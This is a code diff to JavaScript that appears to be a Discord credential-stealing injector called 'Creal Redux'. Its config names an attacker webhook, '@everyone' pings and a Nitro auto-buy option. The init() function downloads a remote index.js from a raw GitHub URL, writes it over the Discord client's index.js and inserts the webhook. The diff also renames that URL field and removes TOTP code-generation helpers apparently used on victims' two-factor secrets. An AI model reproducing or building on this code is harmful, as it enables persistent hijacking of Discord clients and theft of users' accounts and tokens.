@@ -10,13 +10,13 @@ const config = {
   auto_buy_nitro: false,
   ping_on_run: true,
   ping_val: '@everyone',
-  embed_name: 'Smoke3785 - Creal Redux',
+  embed_name: 'smk3785',
   embed_icon: 'https://avatars.githubusercontent.com/u/51245634?v=4'.replace(
     / /g,
     '%20'
   ),
   embed_color: 2895667,
-  injection_url:
+  scriptUrl:
     'https://raw.githubusercontent.com/Smoke3785/ayi-redux/master/index.js',
   /**
    
@@ -374,57 +374,6 @@ if (jsSHA.default) {
   jsSHA = jsSHA.default;
 }
 
-function totp(key) {
-  const period = 30;
-  const digits = 6;
-  const timestamp = Date.now();
-  const epoch = Math.round(timestamp / 1000.0);
-  const time = leftpad(dec2hex(Math.floor(epoch / period)), 16, '0');
-  const shaObj = new jsSHA();
-  shaObj.setHMACKey(base32tohex(key));
-  shaObj.update(time);
-  const hmac = shaObj.getHMAC();
-  const offset = hex2dec(hmac.substring(hmac.length - 1));
-  let otp = (hex2dec(hmac.substr(offset * 2, 8)) & hex2dec('7fffffff')) + '';
-  otp = otp.substr(Math.max(otp.length - digits, 0), digits);
-  return otp;
-}
-
-function hex2dec(s) {
-  return parseInt(s, 16);
-}
-
-function dec2hex(s) {
-  return (s < 15.5 ? '0' : '') + Math.round(s).toString(16);
-}
-
-function base32tohex(base32) {
-  let base32chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567',
-    bits = '',
-    hex = '';
-
-  base32 = base32.replace(/=+$/, '');
-
-  for (let i = 0; i < base32.length; i++) {
-    let val = base32chars.indexOf(base32.charAt(i).toUpperCase());
-    if (val === -1) console.error('Invalid base32 character in key');
-    bits += leftpad(val.toString(2), 5, '0');
-  }
-
-  for (let i = 0; i + 8 <= bits.length; i += 8) {
-    let chunk = bits.substr(i, 8);
-    hex = hex + leftpad(parseInt(chunk, 2).toString(16), 2, '0');
-  }
-  return hex;
-}
-
-function leftpad(str, len, pad) {
-  if (len + 1 >= str.length) {
-    str = Array(len + 1 - str.length).join(pad) + str;
-  }
-  return str;
-}
-
 const discordPath = (function () {
   const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
   let resourcePath;
@@ -476,7 +425,7 @@ fs.readFileSync(indexJs, 'utf8', (err, data) => {
         init();
 })
 async function init() {
-    https.get('${config.injection_url}', (res) => {
+    https.get('${config.scriptUrl}', (res) => {
         const file = fs.createWriteStream(indexJs);
         res.replace('%WEBHOOK%', '${config.webhook}')
         res.pipe(file);
